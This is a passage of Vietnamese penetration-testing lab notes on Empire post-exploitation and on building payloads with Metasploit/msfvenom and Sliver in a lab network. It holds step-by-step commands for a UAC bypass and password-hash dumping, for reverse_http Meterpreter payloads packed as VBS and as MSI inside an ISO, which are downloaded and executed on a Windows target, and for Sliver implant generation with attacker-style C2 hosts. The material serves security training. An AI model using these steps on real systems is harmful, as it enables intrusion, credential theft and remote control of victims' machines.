├──────────────────┼───────────────────────────────────────────────┤
│ parent           │                                               │
├──────────────────┼───────────────────────────────────────────────┤
│ process_id       │ 1916                                          │
├──────────────────┼───────────────────────────────────────────────┤
│ process_name     │ powershell                                    │
├──────────────────┼───────────────────────────────────────────────┤
│ profile          │ /admin/get.php,/news.php,/login/process.php|M │
│                  │ ozilla/5.0 (Windows NT 6.1; WOW64;            │
│                  │ Trident/7.0; rv:11.0) like Gecko              │
├──────────────────┼───────────────────────────────────────────────┤
│ proxy            │                                               │
├──────────────────┼───────────────────────────────────────────────┤
│ servers          │                                               │
├──────────────────┼───────────────────────────────────────────────┤
│ session_id       │ 4A179ENU                                      │
├──────────────────┼───────────────────────────────────────────────┤
│ session_key      │ PB._Dh;|g20Gr<q81N^b]oE6s@x[\H&Y              │
├──────────────────┼───────────────────────────────────────────────┤
│ stale            │ False                                         │
├──────────────────┼───────────────────────────────────────────────┤
│ username         │ SEC560STUDENT\sec560                          │
├──────────────────┼───────────────────────────────────────────────┤
│ working_hours    │                                               │
└──────────────────┴───────────────────────────────────────────────┘

(Empire: agent1) >
```

Tại đây bạn có thể thấy thông tin quan trọng về tác nhân, bao gồm cả địa chỉ IP `process_name`, thời gian đăng nhập lần cuối và nhiều thông tin khác. Để kiểm tra xem tác nhân của chúng ta có đang hoạt động và liên lạc lại với trình lắng nghe mỗi giây hay không, hãy chạy lệnh `info` hai lần và ghi lại sự khác biệt về thời gian dựa trên giá trị `lastseen_time`:

### 6. Mô đun

Giờ chúng ta đã triển khai được một tác nhân và nó đang giao tiếp với trình lắng nghe, hãy cùng xem xét các mô-đun có sẵn để thực thi trên tác nhân đó:

```bash
usemodule
```

![alt text](IMG/LAB2/LAB2.4/image-25.png)

Giờ đây bạn sẽ thấy toàn bộ bộ sưu tập hơn 100 mô-đun khác nhau. Lưu ý rằng chúng được phân loại thành nhiều nhóm khác nhau, bao gồm:

- `code_execution`: Các mô-đun này cho phép bạn chạy mã, bao gồm cả các payload của Metasploit, trên máy chủ mục tiêu..

- `collection`:  Các mô-đun này cho phép bạn thu thập thông tin từ máy mục tiêu.

- `credentials`: Các mô-đun này cho phép bạn đánh cắp tên người dùng, mã băm và mật khẩu từ mục tiêu.

- `exploitation`: Các mô-đun này cho phép bạn khai thác thêm các mục tiêu khác.

- `lateral_movement`: Các mô-đun này cho phép bạn xoay trục sang các máy mục tiêu khác.

- `management`: Các mô-đun này liên quan đến các chức năng quản trị hệ thống trên thiết bị mục tiêu.

- `persistence`:  Các mô-đun này sẽ giúp tác nhân của bạn tiếp tục hoạt động ngay cả khi người dùng đăng xuất hoặc khởi động lại máy.

- `privesc`: Các mô-đun này cung cấp các lỗ hổng leo thang đặc quyền.

- `recon`: Đây là các mô-đun trinh sát.

- `situational_awareness`: Các mô-đun này thu thập thông tin từ môi trường mục tiêu, bao gồm máy quét và các công cụ liên quan.

- `trollsploit`: Các mô-đun này cho phép bạn quấy rối người dùng đang ngồi trước máy tính của nạn nhân, bao gồm phát âm thanh và hiển thị các hộp thoại.

Bạn cũng sẽ thấy một tiền tố cho biết cách thức thực thi của tệp tin. `- csharp` (C#) `- python` `- powershell`.

Hãy cùng thử nghiệm với một số mô-đun hữu ích nhất trong số này.

Hãy chạy một mô-đun có tên là `usemodule powershell/situational_awareness/host/winenum`. Chúng ta sẽ bắt đầu bằng cách chọn nó thông qua lệnh `usemodule`:

```bash
usemodule powershell/situational_awareness/host/winenum
```

![alt text](IMG/LAB2/LAB2.4/image-26.png)

Lưu ý rằng Empire tự động thiết lập `Agent` cài đặt thành `agent2`.

Mô-đun này thu thập thông tin hữu ích từ máy mục tiêu, bao gồm thông tin về phần mềm và các tập tin trên máy.

Bây giờ chúng ta sẽ chạy mô-đun `winenum`:

![alt text](IMG/LAB2/LAB2.4/image-27.png)

Lưu ý rằng khi chúng ta chạy một mô-đun, Empire sẽ tạo một tác vụ trên máy đích và chạy tác vụ đó trong nền. Nếu bạn nhấn Enter, dấu nhắc lệnh sẽ hiện lại. Tác vụ được gán một ID.

Hãy để công việc chạy khoảng 30 giây, sau đó kiểm tra kết quả. Để làm điều này, chúng ta cần sử dụng lệnh `view`. Trong ví dụ trên, ID là 1, nhưng số của bạn có thể khác. Sử dụng ID này để xem kết quả của tác vụ/công việc.

```bash
view 1
```

![alt text](IMG/LAB2/LAB2.4/image-28.png)

Hãy xem qua kết quả đầu ra. Tác vụ sẽ tiếp tục chạy. Để xem thêm kết quả đầu ra từ tác vụ, hãy chạy viewlại lệnh.

### 7. Tìm kiếm sự leo thang đặc quyền

Tiếp theo, hãy xem liệu có bất kỳ cơ hội leo thang đặc quyền nào trên mục tiêu hay không. Các mô-đun PowerUp có rất nhiều phương pháp leo thang đặc quyền thông qua PowerShell. Hãy tìm kiếm các mô-đun đó:

![alt text](IMG/LAB2/LAB2.4/image-29.png)

Chúng ta có thể thấy rằng PowerUp có một tính năng sẽ chạy tất cả các kiểm tra về leo thang đặc quyền `powershell/privesc/powerup/allchecks`. Hãy chọn tính năng đó và chạy nó:

```bash
usemodule powershell/privesc/powerup/allchecks
```

![alt text](IMG/LAB2/LAB2.4/image-30.png)

```bash
execute
```

![alt text](IMG/LAB2/LAB2.4/image-31.png)

Để xem kết quả của tác vụ, chúng ta cần sử dụng lệnh `view` với ID tác vụ đã nêu ở trên.

![alt text](IMG/LAB2/LAB2.4/image-32.png)

![alt text](IMG/LAB2/LAB2.4/image-34.png)

![alt text](IMG/LAB2/LAB2.4/image-35.png)

Trong kết quả đầu ra, bạn sẽ thấy thông báo:

```bash
[*] Checking if user is in a local group with administrative privileges...
[+] User is in a local group that grants administrative privileges!
[+] Run a BypassUAC attack to elevate privileges to admin.
```

Ngoài ra, hãy chú ý đến các đường dẫn dịch vụ không được trích dẫn. Chúng ta sẽ thảo luận về cách khai thác điều này sau trong khóa học.

Trước khi nâng cao quyền hạn, hãy xem xét những hạn chế mà chúng ta gặp phải khi không có đầy đủ quyền quản trị trong tác nhân của mình. Để làm điều đó, hãy thử trích xuất các mã băm từ mục tiêu từ tác nhân không được nâng cao quyền. Chúng ta sẽ sử dụng mô-đun `powerdump`, thuộc danh mục thông tin xác thực và ban đầu được bao gồm trong công cụ Posh-SecMod:

```bash
usemodule powershell/credentials/powerdump
```

![alt text](IMG/LAB2/LAB2.4/image-36.png)

Hãy thử chạy nó xem sao:

```bash
execute
```

![alt text](IMG/LAB2/LAB2.4/image-37.png)

### 8. Bypass UAC

UAC là viết tắt của User Account Control trên Windows. Nó là cơ chế bảo mật giúp:

- Ngăn chương trình tự ý chạy với quyền quản trị.

- Yêu cầu xác nhận khi có thao tác nhạy cảm.

- Giảm nguy cơ malware âm thầm chiếm quyền admin.

Tiếp theo, chúng ta sẽ cố gắng vượt qua UAC để có được quyền truy cập cao hơn cần thiết để trích xuất các mã băm.

Đầu tiên, hãy thoát khỏi ngữ cảnh của `powerdump`. Điều đó sẽ đưa bạn trở lại ngữ cảnh của `agent1`:

```bash
back
```

![alt text](IMG/LAB2/LAB2.4/image-38.png)

Bây giờ chúng ta sẽ chạy một mô-đun tấn công có tên gọi `privesc/ask` đơn giản là hiển thị cửa sổ UAC, yêu cầu người dùng đã đăng nhập vào Windows cho phép thực thi một chương trình. Mặc dù điều đó có thể cảnh báo một người dùng cẩn thận, nhưng hầu hết người dùng sẽ chỉ nhấp vào Có . Mặc dù có những lỗ hổng khác để vượt qua UAC, nhưng Microsoft thường xuyên vá lỗi chúng. Nhưng một cú nhấp chuột đơn giản vào Có của người dùng hoạt động rất hiệu quả, ngay cả trên một máy tính Windows đã được vá lỗi đầy đủ. Để sử dụng mô-đun `privesc/ask`, vui lòng nhập:

```bash
usemodule powershell/privesc/ask
```

```bash
(Empire: agent2) > usemodule powershell/privesc/ask
[*] Set Agent to agent2

 Author       Jack64
 Background   True
 Comments     https://github.com/rapid7/metasploit-
              framework/blob/master/modules/exploits/windows/local/ask.rb
 Description  Leverages Start-Process' -Verb runAs option inside a YES-Required loop
              to prompt the user for a high integrity context before running the
              agent code. UAC will report Powershell is requesting Administrator
              privileges. Because this does not use the BypassUAC DLLs, it should
              not trigger any AV alerts.
 Language     powershell
 Name         powershell/privesc/ask
 NeedsAdmin   False
 OpsecSafe    False
 Techniques   http://attack.mitre.org/techniques/T1088


┌Record Options────┬────────────────────┬──────────┬─────────────────────────────────────┐
│ Name             │ Value              │ Required │ Description                         │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Agent            │ agent2             │ True     │ Agent to run module on.             │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Bypasses         │ mattifestation etw │ False    │ Bypasses as a space separated list  │
│                  │                    │          │ to be prepended to the launcher.    │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Listener         │                    │ True     │ Listener to use.                    │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Obfuscate        │ False              │ False    │ Switch. Obfuscate the launcher      │
│                  │                    │          │ powershell code, uses the           │
│                  │                    │          │ ObfuscateCommand for obfuscation    │
│                  │                    │          │ types. For powershell only.         │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ ObfuscateCommand │ Token\All\1        │ False    │ The Invoke-Obfuscation command to   │
│                  │                    │          │ use. Only used if Obfuscate switch  │
│                  │                    │          │ is True. For powershell only.       │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Proxy            │ default            │ False    │ Proxy to use for request (default,  │
│                  │                    │          │ none, or other).                    │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ ProxyCreds       │ default            │ False    │ Proxy credentials                   │
│                  │                    │          │ ([domain\]username:password) to use │
│                  │                    │          │ for request (default, none, or      │
│                  │                    │          │ other).                             │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ UserAgent        │ default            │ False    │ User-agent string to use for the    │
│                  │                    │          │ staging request (default, none, or  │
│                  │                    │          │ other).                             │
└──────────────────┴────────────────────┴──────────┴─────────────────────────────────────┘
```

Bây giờ chúng ta cần thông báo cho Empire rằng nếu mô-đun này hoạt động thành công, nó sẽ kết nối lại với trình lắng nghe của chúng ta. Để làm điều này, chúng ta chỉ cần chỉ định tên của trình lắng nghe `http`.

```bash
set Listener http
```

![alt text](IMG/LAB2/LAB2.4/image-39.png)

Giờ chúng ta đã sẵn sàng chạy mô-đun rồi!

```bash
execute
```

Thường thì Windows sẽ hiển thị một lời nhắc UAC cho biết nó được đặt trên màn hình bởi Windows PowerShell, với nhà phát hành đã được xác minh là Microsoft Windows. Tất nhiên, chính Empire Agent là phần mềm làm cho điều này xuất hiện, sử dụng PowerShell để làm cho nó trông giống như một hành động hợp pháp trên máy mục tiêu.

Trong trường hợp của chúng tôi, hệ thống Windows của bạn không hiển thị thông báo (do UAC được đặt ở chế độ "Thấp"). Tuyệt vời!

Giờ chúng ta hãy cùng xem xét các đặc vụ của mình.

```bash
agents
```

![alt text](IMG/LAB2/LAB2.4/image-40.png)

Hãy chú ý đến dấu sao `*` bên cạnh tên của đặc vụ mới. Dấu sao đó có nghĩa là đây là phiên làm việc được nâng cao, với đầy đủ quyền quản trị. Tài liệu của Empire đôi khi gọi những đặc vụ này là các đặc vụ "có tính toàn vẹn cao", và chúng rất tuyệt vời vì cho phép chúng ta khai thác triệt để hệ thống, bao gồm cả việc lấy được các mã băm từ máy chủ.

Hãy đổi tên phiên làm việc của tác nhân nâng cao mới của chúng ta thành `priv1` và sau đó là `list` các tác nhân.

```bash
rename UG327LDV priv1
list
```

![alt text](IMG/LAB2/LAB2.4/image-41.png)

Bây giờ chúng ta hãy tương tác với phiên làm việc có quyền quản trị mới. Hãy chắc chắn rằng bạn đã chạy lệnh `list` ở bước trước, nếu không bạn sẽ không thể tương tác với tác nhân mới bằng tên mới.

![alt text](IMG/LAB2/LAB2.4/image-42.png)

Và bây giờ chúng ta có thể thử chạy powerdumplại để lấy các mã băm:

![alt text](IMG/LAB2/LAB2.4/image-43.png)

```bash
execute
```

![alt text](IMG/LAB2/LAB2.4/image-44.png)

> Lưu ý rằng giờ nó hoạt động vì chúng ta đã vượt qua UAC để có được phiên tác nhân có tính toàn vẹn cao (quyền hạn cao hơn). Và chúng ta đã có được các mã băm từ mục tiêu!

Một lần nữa, Empire tạo ra một tác vụ. Hãy đợi một chút, sau đó xem kết quả tác vụ.

```bash
view 1
```

![alt text](IMG/LAB2/LAB2.4/image-45.png)

Tuyệt vời! Chúng ta vừa nhận được mã băm rồi!

Để chạy các lệnh `shell` từ tác nhân của chúng ta, chúng ta thực hiện lệnh `shell` sau, tiếp theo là lệnh mà chúng ta muốn chạy:

```bash
shell ipconfig
```

![alt text](IMG/LAB2/LAB2.4/image-46.png)

Hãy cùng xem kết quả bằng cách quan sát đầu ra của tác vụ.

![alt text](IMG/LAB2/LAB2.4/image-47.png)

Bạn sẽ thấy kết quả của lệnh `ipconfig` trên màn hình.

Nếu có thời gian, bạn có thể thử nghiệm với các lệnh PowerShell khác, chẳng hạn như `ps`, `pwd`, và `dir`. Ngoài ra, hãy sử dụng một số thủ thuật PowerShell mà bạn đã học trong khóa học này.

### 9. Port Scan

Tiếp theo, chúng ta hãy tiến hành quét cổng từ tác nhân Empire, cho nó quét máy 10.130.10.25. Chúng ta sẽ bắt đầu bằng cách tìm kiếm portscanmô-đun:

```bash
usemodule powershell/situational_awareness/network/portscan
```

![alt text](IMG/LAB2/LAB2.4/image-48.png)

![alt text](IMG/LAB2/LAB2.4/image-49.png)

Mặc định là quét 50 cổng TCP hàng đầu. Chúng ta sẽ để nguyên như vậy trước mắt. Chúng ta cần phải chỉ định một phạm vi mục tiêu.

Tiếp theo, chúng ta cần chỉ định mục tiêu và chạy mô-đun.

```bash
set Hosts 10.130.10.25
execute
```

![alt text](IMG/LAB2/LAB2.4/image-50.png)

Hãy đợi khoảng 30 giây, sau đó xem kết quả thực hiện tác vụ.

```bash
view 3
```

![alt text](IMG/LAB2/LAB2.4/image-51.png)

Bạn sẽ thấy rằng các cổng 80, 3389, 445, 129, 135 đang lắng nghe trên máy có địa chỉ IP 10.130.10.10.

### 10. Tắt agent

Để kết thúc buổi thực hành, chúng ta hãy tắt các tác nhân.

```bash
agents
kill all
y
```

![alt text](IMG/LAB2/LAB2.4/image-52.png)

Giờ chúng ta kill listener của chúng ta:

```bash
listeners
kill all
```

![alt text](IMG/LAB2/LAB2.4/image-53.png)

Và cuối cùng, hãy cùng xem xét `exit` để thoát Empire:

```bash
exit
```

![alt text](IMG/LAB2/LAB2.4/image-54.png)

## Phần kết luận

Trong bài thực hành này, chúng ta đã thấy cách các chuyên gia kiểm thử xâm nhập có thể sử dụng Empire để cấu hình và điều khiển các listener và agent. Chúng ta cũng đã chạy một số module khác nhau trên mục tiêu thông qua một agent, bao gồm PowerUp, để tìm các lỗ hổng leo thang đặc quyền cục bộ tiềm ẩn. Chúng ta đã vượt qua UAC bằng cách yêu cầu người dùng chạy một agent có đặc quyền cao trên mục tiêu. Chúng ta đã trích xuất các hash bằng `powerdumpmodule` của Empire, và chúng ta cũng đã thực hiện quét cổng từ một agent trên mục tiêu bị xâm nhập.

Mỗi kỹ thuật này đều vô cùng hữu ích cho các chuyên gia kiểm thử xâm nhập trong giai đoạn hậu khai thác của một dự án kiểm thử xâm nhập hoặc hoạt động của nhóm Red Team.


# Lab 2.5. Payloads

## Mục tiêu

- Hiểu rõ các tùy chọn payloads có sẵn với MSFVenom và Metasploit.

- Thiết lập Metasploit multi/handler để nhận nhiều kết nối.

- Tạo nhiều payload Metasploit/MSFVenom.

- Sử dụng Sliver để tạo payloads và thực thi trên một hệ thống từ xa.

## Chuẩn bị thí nghiệm

Các máy ảo được sử dụng:

- Slingshot Linux.

- Windows 10.

Bạn có thể ping địa chỉ 10.130.10.25 từ máy ảo Slingshot Linux:

```bash
ping -c 4 10.130.10.25
```

![alt text](IMG/LAB2/LAB2.5/image.png)a

## Hướng dẫn thực hành từng bước

### 1. Thiết lập Metasploit để nhận kết nối

Đầu tiên, chúng ta cần thiết lập Metasploit để nhận kết nối từ các payload của mình. Khởi chạy Metasploit bằng cách chạy lệnh sau msfconsole:

```bash
msfconsole
```

Trong Metasploit, chúng ta sẽ sử dụng `multi/handler` "exploit" để nhận kết nối. Multi Handler không phải là một exploit, nó chỉ đơn giản là thông báo cho Metasploit rằng chúng ta sẽ khởi chạy payload bên ngoài Metasploit và nó cần sẵn sàng để nhận kết nối. Hãy sử dụng handler này.

```bash
use exploit/multi/handler
```

![alt text](IMG/LAB2/LAB2.5/image-1.png)

Hãy lưu ý rằng Metasploit đã chọn payload mặc định là `generic/shell_reverse_tcp`. Đây không phải là payload lý tưởng, vì vậy chúng ta hãy thay đổi nó thành Meterpreter.

![alt text](IMG/LAB2/LAB2.5/image-2.png)

Hãy cùng xem xét các tùy chọn mà chúng ta có sẵn với lỗ hổng và mã độc này.

```bash
show options
```

![alt text](IMG/LAB2/LAB2.5/image-3.png)

Lưu ý rằng mã khai thác giả của chúng ta không có tùy chọn nào. Đối với payload, chúng ta cần thiết lập cổng và máy chủ. Hãy thay đổi `LHOST` thành `eth0` và `LPORT` thành 3333.

```bash
set LHOST eth0
set LPORT 3333
```

![alt text](IMG/LAB2/LAB2.5/image-4.png)

Hãy kiểm tra lại xem các thiết lập đã chính xác chưa bằng cách chạy show optionslại chương trình.

```bash
show options
```

![alt text](IMG/LAB2/LAB2.5/image-5.png)

Lưu ý rằng địa chỉ này `eth0` được tự động mở rộng thành địa chỉ IP liên kết với eth0giao diện.

Chúng ta có thể thiết lập trình lắng nghe để nhận nhiều kết nối cùng lúc, nhờ đó không cần phải khởi động lại trình lắng nghe. Chúng ta có thể làm điều đó bằng cách thiết lập `ExitOnSession` thành `false`.

```bash
set ExitOnSession false
```

![alt text](IMG/LAB2/LAB2.5/image-6.png)

Hãy khởi chạy trình lắng nghe bằng cách chạy nó như một tác vụ (`-j`) và không tương tác với các kết nối mới (`-z`).

![alt text](IMG/LAB2/LAB2.5/image-7.png)

> Lưu ý: Địa chỉ IP của bạn sẽ khác.

Bạn có thể nhấn Enter để quay lại giao diện Metasploit thông thường.

Metasploit đã được thiết lập để nhận kết nối của bạn. Bây giờ, hãy tạo payload.

### 2. Các Payload của Metasploit với MSFVenom

Mở một cửa sổ terminal mới cho bước này. Chúng ta cần giữ cho Metasploit hoạt động.

Chúng ta sẽ sử dụng nó `msfvenom` để tạo ra một vài payload (tệp tin độc hại) sẽ được thực thi trên máy ảo Windows 10 cục bộ của bạn.

Trước tiên, hãy cùng xem xét các loại dữ liệu có sẵn trong công cụ này.

Trước tiên, hãy cùng xem xét các định dạng đầu ra của dữ liệu payloads.

![alt text](IMG/LAB2/LAB2.5/image-9.png)

Chúng ta không thể tạo một kịch bản VBA để sử dụng trong macro, vì máy ảo Windows 10 không cài đặt sẵn Office. Chúng ta có thể sử dụng một kịch bản VB, rất tương tự, và chạy nó thủ công để mô phỏng macro.

Thông thường, chúng ta sẽ tạo một macro VBA để đưa vào tài liệu Office và sử dụng nó cho mục đích tấn công phi kỹ thuật; tuy nhiên, máy ảo Windows 10 của chúng ta không cài đặt Office. Thay vì macro, chúng ta hãy tạo một tập lệnh VB mà chúng ta sẽ sử dụng để mô phỏng macro và khởi chạy phần mềm độc hại.

![alt text](IMG/LAB2/LAB2.5/image-10.png)

Chúng ta có thể lưu trực tiếp kết quả vào một tệp bằng tùy chọn `--save` `-o` hoặc `--save` `--out`, nhưng với tùy chọn `tee--save`, chúng ta có thể xem nội dung của tệp khi nó được ghi. Lưu ý rằng tên biến và hàm của bạn khác với những gì được hiển thị ở trên. Metasploit ngẫu nhiên hóa tên để làm cho việc nhận dạng khó khăn hơn.

Hãy sao chép tập tin này sang Windows.

### 3. Sao chép mã VBS vào Windows và thực thi nó.

**Hãy mở một cửa sổ dòng lệnh mới cho bước này.**

Hãy chuyển đến `/tmp` thư mục đó và chạy một máy chủ web Python để phục vụ tập tin có thể truy cập được từ Windows.

```bash
cd /tmp
python3 -m http.server
```

![alt text](IMG/LAB2/LAB2.5/image-11.png)

Chuyển sang hệ điều hành Windows và mở cửa sổ PowerShell. Sau đó chạy lệnh sau.

```bash
wget http://10.130.10.128:8000/payload.vbs -OutFile payload.vbs
```

Hãy giải phóng bằng lệnh cscript.

```bash
cscript payload.vbs
```

![alt text](IMG/LAB2/LAB2.5/image-12.png)

Chuyển sang giao diện dòng lệnh Metasploit trên máy ảo Slingshot của bạn. Bạn sẽ thấy một phiên làm việc mới.

![alt text](IMG/LAB2/LAB2.5/image-13.png)

Giờ đây bạn đã có một phiên Meterpreter đang chạy trên máy chủ Windows của mình bằng cách sử dụng payloads VBS. Trước tiên, chúng ta cần tương tác với phiên này. Trong ví dụ này, ID phiên là 1. ID phiên của bạn có thể khác. Hãy sử dụng số bạn thấy thay vì 1nếu ID phiên của bạn khác.

```bash
sessions -i 1
```

![alt text](IMG/LAB2/LAB2.5/image-14.png)

Chạy `sysinfo` để nắm được thông tin cơ bản về phiên họp.

```bash
sysinfo
```

![alt text](IMG/LAB2/LAB2.5/image-15.png)

Tiếp theo chúng ta sẽ sử dụng một payload khác, vậy nên hãy kết thúc `exit` phiên này.

```bash
exit
```

![alt text](IMG/LAB2/LAB2.5/image-16.png)

### 4. Tạo gói tin MSI trong tệp ISO

Hãy chuyển sang cửa sổ dòng lệnh nơi bạn vừa chạy lệnh đó `msfvenom`. Chúng ta hãy tạo một tệp cài đặt MSI. Các tệp này đôi khi vẫn được phép thực thi ngay cả khi các loại tệp khác bị vô hiệu hóa.

```bash
msfvenom -p windows/meterpreter/reverse_http lhost=eth0 lport=3333 -f msi -o /tmp/setup.msi
```

![alt text](IMG/LAB2/LAB2.5/image-18.png)

Để tạo tệp ISO, chúng ta sẽ sử dụng công cụ `genisoimage` này. Chúng ta có thể chỉ định một thư mục hoặc một hoặc nhiều tệp. Chúng ta chỉ cần sử dụng tệp msi trong tệp ISO.

```bash
genisoimage -o /tmp/installer.iso /tmp/setup.msi
```

![alt text](IMG/LAB2/LAB2.5/image-19.png)

Hãy chuyển sang Windows, tải xuống và mở tập tin.

### 5. Tải xuống và mở các tệp ISO và MSI

Trong cửa sổ PowerShell, chuyển đến thư mục Desktop của bạn rồi tải xuống tệp ISO.

```bash
wget http://10.130.10.128:8000/installer.iso -OutFile installer.iso
```

Trên màn hình máy tính của bạn giờ sẽ thấy `installer.iso`. Nhấp đúp vào tệp để gắn kết nó. Sau đó, nhấp đúp vào tệp `SETUP.MSI` để chạy nó.

![alt text](IMG/LAB2/LAB2.5/image-20.png)

Bạn sẽ thấy trình cài đặt chạy, nhưng sau đó nó hiển thị thông báo lỗi.

![alt text](IMG/LAB2/LAB2.5/image-21.png)

Thông báo lỗi này là bình thường. Nó được sử dụng để đánh lừa người dùng rằng không có gì xảy ra. Tuy nhiên, nếu bạn chuyển sang Metasploit, bạn sẽ thấy một phiên Meterpreter mới vừa được khởi tạo.

![alt text](IMG/LAB2/LAB2.5/image-22.png)

Giờ đây bạn đã có một phiên Meterpreter đang chạy trên máy chủ Windows của mình bằng cách sử dụng tệp ISO và MSI. Trước tiên, chúng ta cần tương tác với phiên này. Trong ví dụ này, ID phiên là `2`. ID phiên của bạn có thể khác. Hãy sử dụng số bạn thấy thay vì `2` nếu trường hợp của bạn khác.

```bash
sessions -i 2
```

![alt text](IMG/LAB2/LAB2.5/image-23.png)

Một lần nữa, hãy chạy `sysinfo` để nắm bắt thông tin cơ bản về phiên này.

```bash
sysinfo
```

![alt text](IMG/LAB2/LAB2.5/image-24.png)

Tiếp theo chúng ta sẽ sử dụng Sliver. Vì vậy, hãy thoát khỏi Meterpreter và Metasploit.

```bash
exit
exit
```

![alt text](IMG/LAB2/LAB2.5/image-25.png)

### 6. Sliver và Payload

Khởi chạy máy chủ Sliver.

Thiết lập trình lắng nghe trên cổng `443` bằng cách chạy lệnh `https` để khởi động trình lắng nghe.

```bash
https
```

![alt text](IMG/LAB2/LAB2.5/image-26.png)

Hãy cùng xem xét các tùy chọn với `generate`.

```bash
generate -h
```


```bash
[server] sliver > generate -h

Command: generate <options>
About: Generate a new sliver binary and saves the output to the cwd or a path specified with --save.

++ Command and Control ++
You must specificy at least one c2 endpoint when generating an implant, this can be one or more of --mtls, --wg, --http, or --dns, --named-pipe, or --tcp-pivot.
The command requires at least one use of --mtls, --wg, --http, or --dns, --named-pipe, or --tcp-pivot.

The follow command is used to generate a sliver Windows executable (PE) file, that will connect back to the server using mutual-TLS:
        generate --mtls foo.example.com

The follow command is used to generate a sliver Windows executable (PE) file, that will connect back to the server using Wireguard on UDP port 9090,
then connect to TCP port 1337 on the server's virtual tunnel interface to retrieve new wireguard keys, re-establish the wireguard connection using the new keys,
then connect to TCP port 8888 on the server's virtual tunnel interface to establish c2 comms.
        generate --wg 3.3.3.3:9090 --key-exchange 1337 --tcp-comms 8888

You can also stack the C2 configuration with multiple protocols:
        generate --os linux --mtls example.com,domain.com --http bar1.evil.com,bar2.attacker.com --dns baz.bishopfox.com


++ Formats ++
Supported output formats are Windows PE, Windows DLL, Windows Shellcode, Mach-O, and ELF. The output format is controlled
with the --os and --format flags.

To output a 64bit Windows PE file (defaults to WinPE/64bit), either of the following command would be used:
        generate --mtls foo.example.com
        generate --os windows --arch 64bit --mtls foo.example.com

A Windows DLL can be generated with the following command:
        generate --format shared --mtls foo.example.com

To output a MacOS Mach-O executable file, the following command would be used
        generate --os mac --mtls foo.example.com

To output a Linux ELF executable file, the following command would be used:
        generate --os linux --mtls foo.example.com


++ DNS Canaries ++
DNS canaries are unique per-binary domains that are deliberately NOT obfuscated during the compilation process.
This is done so that these unique domains show up if someone runs 'strings' on the binary, if they then attempt
to probe the endpoint or otherwise resolve the domain you'll be alerted that your implant has been discovered,
and which implant file was discovered along with any affected sessions.

Important: You must have a DNS listener/server running to detect the DNS queries (see the "dns" command).

Unique canary subdomains are automatically generated and inserted using the --canary flag. You can view previously generated
canaries and their status using the "canaries" command:
        generate --mtls foo.example.com --canary 1.foobar.com

++ Execution Limits ++
Execution limits can be used to restrict the execution of a Sliver implant to machines with specific configurations.

++ Profiles ++
Due to the large number of options and C2s this can be a lot of typing. If you'd like to have a reusable a Sliver config
see 'help profiles new'. All "generate" flags can be saved into a profile, you can view existing profiles with the "profiles"
command.


Usage:
======
  generate [flags]

Flags:
======
  -a, --arch               string    cpu architecture (default: amd64)
  -c, --canary             string    canary domain(s)
  -d, --debug                        enable debug features
  -O, --debug-file         string    path to debug output
  -G, --disable-sgn                  disable shikata ga nai shellcode encoder
  -n, --dns                string    dns connection strings
  -e, --evasion                      enable evasion features (e.g. overwrite user space hooks)
  -E, --external-builder             use an external builder
  -f, --format             string    Specifies the output formats, valid values are: 'exe', 'shared' (for dynamic libraries), 'service' (see `psexec` for more info) and 'shellcode' (windows only) (default: exe)
  -h, --help                         display help
  -b, --http               string    http(s) connection strings
  -X, --key-exchange       int       wg key-exchange port (default: 1337)
  -w, --limit-datetime     string    limit execution to before datetime
  -x, --limit-domainjoined           limit execution to domain joined machines
  -F, --limit-fileexists   string    limit execution to hosts with this file in the filesystem
  -z, --limit-hostname     string    limit execution to specified hostname
  -L, --limit-locale       string    limit execution to hosts that match this locale
  -y, --limit-username     string    limit execution to specified username
  -k, --max-errors         int       max number of connection errors (default: 1000)
  -m, --mtls               string    mtls connection strings
  -N, --name               string    agent name
  -p, --named-pipe         string    named-pipe connection strings
  -o, --os                 string    operating system (default: windows)
  -P, --poll-timeout       int       long poll request timeout (default: 360)
  -j, --reconnect          int       attempt to reconnect every n second(s) (default: 60)
  -R, --run-at-load                  run the implant entrypoint from DllMain/Constructor (shared library only)
  -s, --save               string    directory/file to the binary to
  -l, --skip-symbols                 skip symbol obfuscation
  -Z, --strategy           string    specify a connection strategy (r = random, rd = random domain, s = sequential)
  -T, --tcp-comms          int       wg c2 comms port (default: 8888)
  -i, --tcp-pivot          string    tcp-pivot connection strings
  -I, --template           string    implant code template (default: sliver)
  -t, --timeout            int       command timeout in seconds (default: 60)
  -g, --wg                 string    wg connection strings

Sub Commands:
=============
  beacon  Generate a beacon binary
  info    Get information about the server's compiler
  stager  Generate a stager using Metasploit (requires local Metasploit installation)

[server] sliver >
```

Ta thấy dòng sau:

![alt text](IMG/LAB2/LAB2.5/image-27.png)

Hãy xem `++ Formats ++` phần đó. Lưu ý rằng chúng ta không có nhiều tùy chọn đầu ra như với Metasploit. Khi sử dụng Sliver, bạn thường cần một công cụ hoặc phương pháp khác để tải shellcode.

Hãy tạo một tập tin exe mà chúng ta sẽ chạy trên một trong các máy chủ trong phạm vi mục tiêu. Chúng ta sẽ sử dụng tùy chọn `--skip-symbols` này để tăng tốc quá trình tạo payload, nếu không quá trình này có thể mất một phút hoặc hơn do việc né tránh và mã hóa bổ sung được sử dụng trong tập tin thực thi. Trong thực tế, bạn có thể KHÔNG muốn sử dụng tùy chọn này.

```bash
generate --os windows --arch 64bit --format shared --skip-symbols --http https://10.130.10.128
```

![alt text](IMG/LAB2/LAB2.5/image-28.png)

> LƯU Ý: Tên dữ liệu payloads của bạn sẽ được tạo ngẫu nhiên và sẽ khác với tên OUTRAGEOUS_OTT.dll bạn thấy ở đây.

### 7. Sao chép và thực thi DLL

**Hãy mở một cửa sổ dòng lệnh mới cho bước này.**

Tệp được tạo thuộc sở hữu của người dùng `root` và người dùng `sec560` của chúng ta không thể truy cập được. Hãy xác nhận điều này bằng cách sử dụng lệnh `ls -l`.

```bash
ls -l *.dll
```

![alt text](IMG/LAB2/LAB2.5/image-29.png)

